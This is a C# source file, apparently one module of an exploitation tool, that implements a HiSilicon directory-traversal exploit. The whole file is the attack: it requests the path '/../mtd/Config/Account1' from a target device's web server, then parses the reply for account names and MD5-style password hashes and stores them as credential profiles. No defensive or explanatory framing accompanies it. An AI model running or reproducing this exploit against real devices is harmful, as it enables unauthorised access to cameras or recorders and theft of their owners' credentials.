using System;
using System.Net;

using Kaye.Net;
using Kaye.Models;
using Kaye.Profiles;

namespace Kaye.Exploits
{
    public class HiSiliconPathTraversal : Exploit
    {
        private static String TraversalPath = "/../mtd/Config/Account1";

        public override String GetMessage() { return "HiSilicon directory traversal"; }

        public Profile[] Profiles;
        public Model Model;

        public static Boolean TryPerform(IPEndPoint Target, out HiSiliconPathTraversal Output)
        {
            Output = new HiSiliconPathTraversal();
            Output.Model = Model.HiSilicon;
            HTTPSender Http = new HTTPSender(Target);
            String Response = Http.DownloadString(TraversalPath);
            if (Response == null || Response.Length == 0 || HTTPSender.CodeFromResponse(Response) != 200) return false;
            Int32 Pos = Response.IndexOf("\"Users\""), ProfileCount = 0;

            try
            {
                while ((Pos = Response.IndexOf("\"Name\"", Pos + 1)) != -1) ProfileCount++;

                Pos = Response.IndexOf("\"Users\"");
                if (Pos == -1) return false;
                Pos = Response.IndexOf("\"Name\"", Pos);
                Output.Profiles = new Profile[ProfileCount];
                ProfileCount = 0;

                while (Pos != -1)
                {
                    String User = String.Empty;
                    String Hash = String.Empty;

                    Pos += 10;

                    while (Response[Pos] != '"')
                    {
                        User += Response[Pos];
                        Pos++;
                    }

                    Pos = Response.IndexOf("\"Password\"", Pos);
                    Pos += 14;

                    while (Response[Pos] != '"')
                    {
                        Hash += Response[Pos];
                        Pos++;
                    }

                    Output.Profiles[ProfileCount] = new Profile(User, Hash, HashAlg.ShortMD5);
                    Pos = Response.IndexOf("\"Name\"", Pos);
                    ProfileCount++;
                }
                return true;
            }

            catch { }

            return false;
        }
    }
}